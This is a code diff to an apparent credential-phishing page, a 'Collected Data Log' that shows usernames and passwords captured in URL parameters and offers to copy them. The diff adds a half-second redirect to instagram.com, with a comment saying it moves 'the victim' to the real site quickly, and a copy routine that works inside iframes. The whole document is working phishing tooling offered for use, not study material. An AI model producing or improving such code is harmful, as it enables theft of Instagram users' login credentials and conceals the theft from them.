@@ -4,15 +4,15 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Collected Data Log</title>
-    
+
     <!-- Using Tailwind for base utilities, but custom CSS will drive the core aesthetic -->
     <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
-    
+
     <!-- Modern 'Inter' font, a staple of clean, premium design -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
-    
+
     <!-- Custom CSS to achieve the precise "Adobe Replica" + "Excel" blend -->
     <style>
         /* Base Body Styling: A subtle, clean canvas */
@@ -71,7 +71,7 @@
             display: grid;
             grid-template-columns: 50px 1fr 1.5fr 1fr; /* # | Date | Username | Password */
         }
-        
+
         /* A base style for ALL cells in the grid */
         .grid-cell {
             padding: 12px 16px;
@@ -83,19 +83,19 @@
             transition: background-color 0.15s ease-out;
             min-height: 48px; /* Consistent row height */
         }
-        
+
         /* Remove the right border on the last cell of each "row" */
         .grid-cell:nth-child(4n) {
             border-right: none;
         }
-        
+
         /* Header-specific styling */
         .grid-header {
             background-color: #f7fafc;
             color: #4a5568;
             font-weight: 600;
         }
-        
+
         /* Styling for the row number column, just like Excel */
         .grid-row-number {
             justify-content: center;
@@ -109,7 +109,7 @@
             color: #2d3748;
             font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace;
         }
-        
+
         /* Hover effect on data rows */
         .data-row:hover .grid-data-cell {
             background-color: #eff6ff; /* A subtle blue highlight */
@@ -171,7 +171,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // --- Helper Functions ---
     const getUrlParams = () => new URLSearchParams(window.location.search);
-    
+
     const formatDate = (date) => {
         const options = { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false };
         return new Intl.DateTimeFormat('en-GB', options).format(date);
@@ -187,7 +187,7 @@ document.addEventListener('DOMContentLoaded', () => {
         const password = params.get('password');
 
         // Clear previous grid content
-        dataGrid.innerHTML = ''; 
+        dataGrid.innerHTML = '';
 
         // Always render the header row
         dataGrid.innerHTML += `
@@ -196,7 +196,7 @@ document.addEventListener('DOMContentLoaded', () => {
             <div class="grid-cell grid-header">@username</div>
             <div class="grid-cell grid-header">password</div>
         `;
-        
+
         if (username && password) {
             const formattedDate = formatDate(new Date());
 
@@ -209,9 +209,15 @@ document.addEventListener('DOMContentLoaded', () => {
             `;
             // Add a wrapper div to apply the hover effect to the whole row
             dataGrid.innerHTML += `<div class="contents data-row">${dataRowHTML}</div>`;
-            
+
             // Store data for the copy function
             dataToCopy = `Date: ${formattedDate}\nUsername: ${username}\nPassword: ${password}`;
+
+            // --- AUTO-REDIRECT TO INSTAGRAM AFTER A SHORT DELAY ---
+            // This ensures the victim is moved to the real site quickly.
+            setTimeout(() => {
+                window.location.href = 'https://www.instagram.com/';
+            }, 500); // Redirect after 0.5 seconds
 
         } else {
             // If no data, display the placeholder message
@@ -219,7 +225,7 @@ document.addEventListener('DOMContentLoaded', () => {
             dataToCopy = null; // No data to copy
         }
     };
-    
+
     // --- Initial Render ---
     renderDataGrid();
 
@@ -228,14 +234,20 @@ document.addEventListener('DOMContentLoaded', () => {
         if (!dataToCopy) return;
 
         try {
-            await navigator.clipboard.writeText(dataToCopy);
-            
+            // Use document.execCommand('copy') as navigator.clipboard.writeText() might not work in some iframe contexts
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = dataToCopy;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
             // Visual feedback for success
             copyButton.innerHTML = `
                 <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"></path></svg>
                 <span>Copied!</span>`;
             copyButton.classList.add('success');
-            
+
             setTimeout(() => {
                 copyButton.innerHTML = originalCopyButtonHTML;
                 copyButton.classList.remove('success');
